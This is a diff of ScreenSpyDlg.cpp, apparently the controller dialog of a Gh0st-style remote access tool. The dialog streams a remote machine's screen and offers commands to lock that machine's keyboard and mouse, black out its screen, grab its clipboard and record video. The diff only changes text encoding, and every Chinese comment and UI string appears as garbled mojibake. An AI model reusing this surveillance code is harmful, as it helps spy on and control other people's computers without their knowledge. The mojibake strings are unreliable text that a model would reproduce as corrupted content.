@@ -1,4 +1,4 @@
-// ScreenSpyDlg.cpp : implementation file
+ï»¿// ScreenSpyDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -13,15 +13,15 @@
 enum
 {
 	IDM_CONTROL = 0x0010,
-	IDM_TRACE_CURSOR,	// ¸ú×ÙÏÔÊ¾Ô¶³ÌÊó±ê
-	IDM_BLOCK_INPUT,	// Ëø¶¨Ô¶³Ì¼ÆËã»úÊäÈë
-	IDM_BLANK_SCREEN,	// ºÚÆÁ
-	IDM_CAPTURE_LAYER,	// ²¶×½²ã
-	IDM_SAVEDIB,		// ±£´æÍ¼Æ¬
-	IDM_SAVEAVI_S,      // ±£´æÂ¼Ïñ
-	IDM_GET_CLIPBOARD,	// »ñÈ¡¼ôÌù°å
-	IDM_SET_CLIPBOARD,	// ÉèÖÃ¼ôÌù°å
-	IDM_DEEP_1,			// ÆÁÄ»É«²ÊÉî¶È.....
+	IDM_TRACE_CURSOR,	// è·Ÿè¸ªæ˜¾ç¤ºè¿œç¨‹é¼ æ ‡
+	IDM_BLOCK_INPUT,	// é”å®šè¿œç¨‹è®¡ç®—æœºè¾“å…¥
+	IDM_BLANK_SCREEN,	// é»‘å±
+	IDM_CAPTURE_LAYER,	// æ•æ‰å±‚
+	IDM_SAVEDIB,		// ä¿å­˜å›¾ç‰‡
+	IDM_SAVEAVI_S,      // ä¿å­˜å½•åƒ
+	IDM_GET_CLIPBOARD,	// è·å–å‰ªè´´æ¿
+	IDM_SET_CLIPBOARD,	// è®¾ç½®å‰ªè´´æ¿
+	IDM_DEEP_1,			// å±å¹•è‰²å½©æ·±åº¦.....
 	IDM_DEEP_4_GRAY,
 	IDM_DEEP_4_COLOR,
 	IDM_DEEP_8_GRAY,
@@ -50,7 +50,7 @@ CDifScreenSpyDlg::CDifScreenSpyDlg(CWnd* pParent, ISocketBase* pIOCPServer, Clie
 
 	m_iocpServer = pIOCPServer;
 	m_pContext = pContext;
-	m_bIsFirst = true; // Èç¹ûÊÇµÚÒ»´Î´ò¿ª¶Ô»°¿ò£¬ÏÔÊ¾ÌáÊ¾µÈ´ıĞÅÏ¢
+	m_bIsFirst = true; // å¦‚æœæ˜¯ç¬¬ä¸€æ¬¡æ‰“å¼€å¯¹è¯æ¡†ï¼Œæ˜¾ç¤ºæç¤ºç­‰å¾…ä¿¡æ¯
 	m_lpScreenDIB = NULL;
 	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_SCREENSYP));
 	m_IPAddress = m_pContext->szAddress;
@@ -59,7 +59,7 @@ CDifScreenSpyDlg::CDifScreenSpyDlg(CWnd* pParent, ISocketBase* pIOCPServer, Clie
 	m_lpbmi_rect = (BITMAPINFO*) new BYTE[nBISize];
 	memcpy(m_lpbmi, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
 	memcpy(m_lpbmi_rect, m_pContext->m_DeCompressionBuffer.GetBuffer(1), nBISize);
-	m_bIsCtrl = false; // Ä¬ÈÏ²»¿ØÖÆ
+	m_bIsCtrl = false; // é»˜è®¤ä¸æ§åˆ¶
 	m_bCursorIndex = 1;
 	m_bOnClose = FALSE;
 	m_nCount=0;
@@ -187,7 +187,7 @@ void CDifScreenSpyDlg::OnReceive()
 		return;
 	if (m_bOnClose) 	return;
 	CString str;
-	str.Format(_T("²îÒìÆÁÄ»¼à¿Ø \\\\ %s %d * %d µÚ%dÖ¡  [ÊÕ°ü:%d ÊÕ:%d KB] [·¢°ü:%d ·¢:%d KB]"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_nCount, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
+	str.Format(_T("å·®å¼‚å±å¹•ç›‘æ§ \\\\ %s %d * %d ç¬¬%då¸§  [æ”¶åŒ…:%d æ”¶:%d KB] [å‘åŒ…:%d å‘:%d KB]"), m_IPAddress, m_lpbmi->bmiHeader.biWidth, m_lpbmi->bmiHeader.biHeight, m_nCount, m_pContext->m_allpack_rev, int(m_pContext->m_alldata_rev / 1024), m_pContext->m_allpack_send, int(m_pContext->m_alldata_send / 1024));
 	SetWindowText(str);
 }
 
@@ -195,7 +195,7 @@ void CDifScreenSpyDlg::OnReceive()
 bool CDifScreenSpyDlg::SaveSnapshot()
 {
 	CString	strFileName = m_IPAddress + CTime::GetCurrentTime().Format(_T("_%Y-%m-%d_%H-%M-%S.bmp"));
-	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("Î»Í¼ÎÄ¼ş(*.bmp)|*.bmp|"), this);
+	CFileDialog dlg(FALSE, _T("bmp"), strFileName, OFN_OVERWRITEPROMPT, _T("ä½å›¾æ–‡ä»¶(*.bmp)|*.bmp|"), this);
 	if (dlg.DoModal() != IDOK)
 		return false;
 
@@ -204,10 +204,10 @@ bool CDifScreenSpyDlg::SaveSnapshot()
 	CFile	file;
 	if (!file.Open(dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
 	{
-		MessageBox(_T("ÎÄ¼ş±£´æÊ§°Ü"));
+		MessageBox(_T("æ–‡ä»¶ä¿å­˜å¤±è´¥"));
 		return false;
 	}
-	// BITMAPINFO´óĞ¡
+	// BITMAPINFOå¤§å°
 	int	nbmiSize = sizeof(BITMAPINFOHEADER) + (lpbi->bmiHeader.biBitCount > 16 ? 1 : (1 << lpbi->bmiHeader.biBitCount)) * sizeof(RGBQUAD);
 	// Fill in the fields of the file header
 	hdr.bfType = ((WORD)('M' << 8) | 'B');	// is always "BM"
@@ -255,24 +255,24 @@ BOOL CDifScreenSpyDlg::OnInitDialog()
 	if (pSysMenu != NULL)
 	{
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("¿ØÖÆÆÁÄ»(&Y)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, _T("¸ú×Ù·şÎñ¶ËÊó±ê(&T)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, _T("Ëø¶¨·şÎñ¶ËÊó±êºÍ¼üÅÌ(&L)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, _T("·şÎñ¶ËºÚÆÁ(&B)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, _T("²¶×½²ã(µ¼ÖÂÊó±êÉÁË¸)(&L)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("±£´æ¿ìÕÕ(&S)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("±£´æÂ¼Ïñ¡ª±ØĞë°²×°XvidÂ¼ÖÆÊÓÆµ½âÂëÆ÷(&A)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_CONTROL, _T("æ§åˆ¶å±å¹•(&Y)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, _T("è·Ÿè¸ªæœåŠ¡ç«¯é¼ æ ‡(&T)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, _T("é”å®šæœåŠ¡ç«¯é¼ æ ‡å’Œé”®ç›˜(&L)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_BLANK_SCREEN, _T("æœåŠ¡ç«¯é»‘å±(&B)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_CAPTURE_LAYER, _T("æ•æ‰å±‚(å¯¼è‡´é¼ æ ‡é—ªçƒ)(&L)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, _T("ä¿å­˜å¿«ç…§(&S)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_SAVEAVI_S, _T("ä¿å­˜å½•åƒâ€”å¿…é¡»å®‰è£…Xvidå½•åˆ¶è§†é¢‘è§£ç å™¨(&A)"));
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("»ñÈ¡¼ôÌù°å(&R)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("ÉèÖÃ¼ôÌù°å(&L)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, _T("è·å–å‰ªè´´æ¿(&R)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, _T("è®¾ç½®å‰ªè´´æ¿(&L)"));
 		pSysMenu->AppendMenu(MF_SEPARATOR);
-		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1, _T("1 Î»ºÚ°×(&A)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY, _T("4 Î»»Ò¶È(&B)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_COLOR, _T("4 Î»²ÊÉ«(&C)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_GRAY, _T("8 Î»»Ò¶È(&D)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, _T("8 Î»²ÊÉ«(&E)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_16, _T("16Î»¸ß²Ê(&F)"));
-		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, _T("32Î»Õæ²Ê(&G)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_1, _T("1 ä½é»‘ç™½(&A)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_GRAY, _T("4 ä½ç°åº¦(&B)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_4_COLOR, _T("4 ä½å½©è‰²(&C)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_GRAY, _T("8 ä½ç°åº¦(&D)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_8_COLOR, _T("8 ä½å½©è‰²(&E)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_16, _T("16ä½é«˜å½©(&F)"));
+		pSysMenu->AppendMenu(MF_STRING, IDM_DEEP_32, _T("32ä½çœŸå½©(&G)"));
 		pSysMenu->AppendMenu(MF_SEPARATOR);
 
 		pSysMenu->AppendMenu(MF_STRING, IDM_FPS_1, _T("FPS-1"));
@@ -301,7 +301,7 @@ BOOL CDifScreenSpyDlg::OnInitDialog()
 	m_RemoteCursorPos.x = 0;
 	m_RemoteCursorPos.x = 0;
 	m_bIsTraceCursor = false;
-	// ³õÊ¼»¯´°¿Ú´óĞ¡½á¹¹
+	// åˆå§‹åŒ–çª—å£å¤§å°ç»“æ„
 	m_hDC = ::GetDC(m_hWnd);
 	m_hMemDC = CreateCompatibleDC(m_hDC);
 	m_hFullBitmap = CreateDIBSection(m_hDC, m_lpbmi, DIB_RGB_COLORS, &m_lpScreenDIB, NULL, NULL);
@@ -339,7 +339,7 @@ void CDifScreenSpyDlg::ResetScreen()
 		SelectObject(m_hMemDC, m_hFullBitmap);
 		SetStretchBltMode(m_hDC, STRETCH_HALFTONE);
 		SetStretchBltMode(m_hMemDC, STRETCH_HALFTONE);
-		// ·Ö±æÂÊ·¢Éú¸Ä±ä
+		// åˆ†è¾¨ç‡å‘ç”Ÿæ”¹å˜
 	//	if (nOldWidth != m_lpbmi->bmiHeader.biWidth || nOldHeight != m_lpbmi->bmiHeader.biHeight)
 		//{
 		GetClientRect(&rect);
@@ -354,19 +354,19 @@ void CDifScreenSpyDlg::ResetScreen()
 
 void CDifScreenSpyDlg::DrawNextScreenDiff(PBYTE pDeCompressionData, unsigned long	destLen)
 {
-	// ¸ù¾İÊó±êÊÇ·ñÒÆ¶¯ºÍÆÁÄ»ÊÇ·ñ±ä»¯ÅĞ¶ÏÊÇ·ñÖØ»æÊó±ê£¬·ÀÖ¹Êó±êÉÁË¸
+	// æ ¹æ®é¼ æ ‡æ˜¯å¦ç§»åŠ¨å’Œå±å¹•æ˜¯å¦å˜åŒ–åˆ¤æ–­æ˜¯å¦é‡ç»˜é¼ æ ‡ï¼Œé˜²æ­¢é¼ æ ‡é—ªçƒ
 	bool	bIsReDraw = false;
-	int		nHeadLength = sizeof(POINT) + sizeof(BYTE); // ±êÊ¶ + ¹â±êÎ»ÖÃ + ¹â±êÀàĞÍË÷Òı
+	int		nHeadLength = sizeof(POINT) + sizeof(BYTE); // æ ‡è¯† + å…‰æ ‡ä½ç½® + å…‰æ ‡ç±»å‹ç´¢å¼•
 	LPVOID	lpFirstScreen = m_lpScreenDIB;
 	LPVOID	lpNextScreen = pDeCompressionData + nHeadLength;
 	DWORD	dwBytes = destLen - nHeadLength;
 	POINT	oldPoint;
 	memcpy(&oldPoint, &m_RemoteCursorPos, sizeof(POINT));
 	memcpy(&m_RemoteCursorPos, pDeCompressionData, sizeof(POINT));
-	// Êó±êÒÆ¶¯ÁË
+	// é¼ æ ‡ç§»åŠ¨äº†
 	if (memcmp(&oldPoint, &m_RemoteCursorPos, sizeof(POINT)) != 0)
 		bIsReDraw = true;
-	// ¹â±êÀàĞÍ·¢Éú±ä»¯
+	// å…‰æ ‡ç±»å‹å‘ç”Ÿå˜åŒ–
 	int	nOldCursorIndex = m_bCursorIndex;
 	LPBYTE lpNextCursorIndex = (LPBYTE)(pDeCompressionData + 8);
 	if (*lpNextCursorIndex != m_bCursorIndex)
@@ -378,7 +378,7 @@ void CDifScreenSpyDlg::DrawNextScreenDiff(PBYTE pDeCompressionData, unsigned lon
 			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));
 	}
 
-	// ÆÁÄ»ÊÇ·ñ±ä»¯
+	// å±å¹•æ˜¯å¦å˜åŒ–
 	if (dwBytes > 0)
 		bIsReDraw = true;
 	//EnterCriticalSection(&m_cs);
@@ -390,15 +390,15 @@ void CDifScreenSpyDlg::DrawNextScreenDiff(PBYTE pDeCompressionData, unsigned lon
 		jmp	CopyEnd
 		CopyNextBlock :
 		mov edi, [lpFirstScreen]
-			lodsd	// °ÑlpNextScreenµÄµÚÒ»¸öË«×Ö½Ú£¬·Åµ½eaxÖĞ,¾ÍÊÇDIBÖĞ¸Ä±äÇøÓòµÄÆ«ÒÆ
-			add edi, eax	// lpFirstScreenÆ«ÒÆeax	
-			lodsd // °ÑlpNextScreenµÄÏÂÒ»¸öË«×Ö½Ú£¬·Åµ½eaxÖĞ, ¾ÍÊÇ¸Ä±äÇøÓòµÄ´óĞ¡
+			lodsd	// æŠŠlpNextScreençš„ç¬¬ä¸€ä¸ªåŒå­—èŠ‚ï¼Œæ”¾åˆ°eaxä¸­,å°±æ˜¯DIBä¸­æ”¹å˜åŒºåŸŸçš„åç§»
+			add edi, eax	// lpFirstScreenåç§»eax	
+			lodsd // æŠŠlpNextScreençš„ä¸‹ä¸€ä¸ªåŒå­—èŠ‚ï¼Œæ”¾åˆ°eaxä¸­, å°±æ˜¯æ”¹å˜åŒºåŸŸçš„å¤§å°
 			mov ecx, eax
-			sub ebx, 8 // ebx ¼õÈ¥ Á½¸ödword
-			sub ebx, ecx // ebx ¼õÈ¥DIBÊı¾İµÄ´óĞ¡
+			sub ebx, 8 // ebx å‡å» ä¸¤ä¸ªdword
+			sub ebx, ecx // ebx å‡å»DIBæ•°æ®çš„å¤§å°
 			rep movsb
 			CopyEnd :
-		cmp ebx, 0 // ÊÇ·ñĞ´ÈëÍê±Ï
+		cmp ebx, 0 // æ˜¯å¦å†™å…¥å®Œæ¯•
 			jnz CopyNextBlock
 	}
 	//LeaveCriticalSection(&m_cs);
@@ -443,9 +443,9 @@ void  CDifScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 	case SC_MAXIMIZE:
 		OnNcLButtonDblClk(HTCAPTION, NULL);
 		return;
-	case SC_MONITORPOWER: // À¹½ØÏÔÊ¾Æ÷½Úµç×Ô¶¯¹Ø±ÕµÄÏûÏ¢
+	case SC_MONITORPOWER: // æ‹¦æˆªæ˜¾ç¤ºå™¨èŠ‚ç”µè‡ªåŠ¨å…³é—­çš„æ¶ˆæ¯
 		return;
-	case SC_SCREENSAVE:   // À¹½ØÆÁÄ»±£»¤Æô¶¯µÄÏûÏ¢
+	case SC_SCREENSAVE:   // æ‹¦æˆªå±å¹•ä¿æŠ¤å¯åŠ¨çš„æ¶ˆæ¯
 		return;
 	case IDM_CONTROL:
 	{
@@ -463,7 +463,7 @@ void  CDifScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
 	}
 	break;
-	case IDM_TRACE_CURSOR: // ¸ú×Ù·şÎñ¶ËÊó±ê
+	case IDM_TRACE_CURSOR: // è·Ÿè¸ªæœåŠ¡ç«¯é¼ æ ‡
 	{
 		m_bIsTraceCursor = !m_bIsTraceCursor;
 		pSysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);
@@ -474,11 +474,11 @@ void  CDifScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 			else
 				SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
 		}
-		// ÖØ»æÏû³ı»òÏÔÊ¾Êó±ê
+		// é‡ç»˜æ¶ˆé™¤æˆ–æ˜¾ç¤ºé¼ æ ‡
 		PostMessage(WM_PAINT);
 	}
 	break;
-	case IDM_BLOCK_INPUT: // Ëø¶¨·şÎñ¶ËÊó±êºÍ¼üÅÌ
+	case IDM_BLOCK_INPUT: // é”å®šæœåŠ¡ç«¯é¼ æ ‡å’Œé”®ç›˜
 	{
 		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
 		pSysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -489,7 +489,7 @@ void  CDifScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
 	}
 	break;
-	case IDM_BLANK_SCREEN: // ·şÎñ¶ËºÚÆÁ
+	case IDM_BLANK_SCREEN: // æœåŠ¡ç«¯é»‘å±
 	{
 		bool bIsChecked = (pSysMenu->GetMenuState(IDM_BLANK_SCREEN, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
 		pSysMenu->CheckMenuItem(IDM_BLANK_SCREEN, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -501,7 +501,7 @@ void  CDifScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
 	}
 	break;
-	case IDM_CAPTURE_LAYER: // ²¶×½²ã
+	case IDM_CAPTURE_LAYER: // æ•æ‰å±‚
 	{
 		bool bIsChecked = (pSysMenu->GetMenuState(IDM_CAPTURE_LAYER, MF_BYCOMMAND) & MF_CHECKED) ? true : false;
 		pSysMenu->CheckMenuItem(IDM_CAPTURE_LAYER, bIsChecked ? MF_UNCHECKED : MF_CHECKED);
@@ -530,7 +530,7 @@ void  CDifScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 
 		if (m_lpbmi->bmiHeader.biBitCount <= 15)
 		{
-			AfxMessageBox(_T("²»Ö§³Ö16Î»¼°ÒÔÏÂÑÕÉ«Â¼Ïñ"));
+			AfxMessageBox(_T("ä¸æ”¯æŒ16ä½åŠä»¥ä¸‹é¢œè‰²å½•åƒ"));
 			return;
 		}
 
@@ -556,13 +556,13 @@ void  CDifScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
 
 	}
 	break;
-	case IDM_GET_CLIPBOARD: // »ñÈ¡¼ôÌù°å
+	case IDM_GET_CLIPBOARD: // è·å–å‰ªè´´æ¿
 	{
 		BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD_DIF;
 		m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));
 	}
 	break;
-	case IDM_SET_CLIPBOARD: // ÉèÖÃ¼ôÌù°å
+	case IDM_SET_CLIPBOARD: // è®¾ç½®å‰ªè´´æ¿
 	{
 		SendLocalClipboard();
 	}
@@ -802,7 +802,7 @@ void CDifScreenSpyDlg::DoPaint()
 {
 	if (m_bIsFirst)
 	{
-		DrawTipString(_T("ÇëÉÔºò - ³õÊ¼ÆÁÄ»¼ÓÔØ"));
+		DrawTipString(_T("è¯·ç¨å€™ - åˆå§‹å±å¹•åŠ è½½"));
 		return;
 	}
 	if (m_bOnClose) return;
@@ -832,7 +832,7 @@ void CDifScreenSpyDlg::OnPaint()
 
 	if (m_bIsFirst)
 	{
-		DrawTipString(_T("ÇëÉÔºò - ³õÊ¼ÆÁÄ»¼ÓÔØ"));
+		DrawTipString(_T("è¯·ç¨å€™ - åˆå§‹å±å¹•åŠ è½½"));
 		return;
 	}
 	if (m_bOnClose) return;
@@ -871,7 +871,7 @@ LRESULT CDifScreenSpyDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
 	// TODO: Add your specialized code here and/or call the base class
 	if (message == WM_POWERBROADCAST && wParam == PBT_APMQUERYSUSPEND)
 	{
-		return BROADCAST_QUERY_DENY; // À¹½ØÏµÍ³´ı»ú, ĞİÃßµÄÇëÇó
+		return BROADCAST_QUERY_DENY; // æ‹¦æˆªç³»ç»Ÿå¾…æœº, ä¼‘çœ çš„è¯·æ±‚
 	}
 	if (message == WM_ACTIVATE && LOWORD(wParam) != WA_INACTIVE && !HIWORD(wParam))
 	{
@@ -892,11 +892,11 @@ void CDifScreenSpyDlg::OnTimer(UINT nIDEvent)
 
 	if (!m_aviFile.IsEmpty())
 	{
-		LPCTSTR	lpTipsString = _T("¡ñ");
+		LPCTSTR	lpTipsString = _T("â—");
 
 		m_aviStream.Write(m_lpScreenDIB);
 
-		// ÌáÊ¾ÕıÔÚÂ¼Ïñ
+		// æç¤ºæ­£åœ¨å½•åƒ
 		//SetBkMode(m_hDC, TRANSPARENT);
 		SetTextColor(m_hDC, RGB(0xff, 0x00, 0x00));
 		TextOut(m_hDC, 0, 0, lpTipsString, lstrlen(lpTipsString));
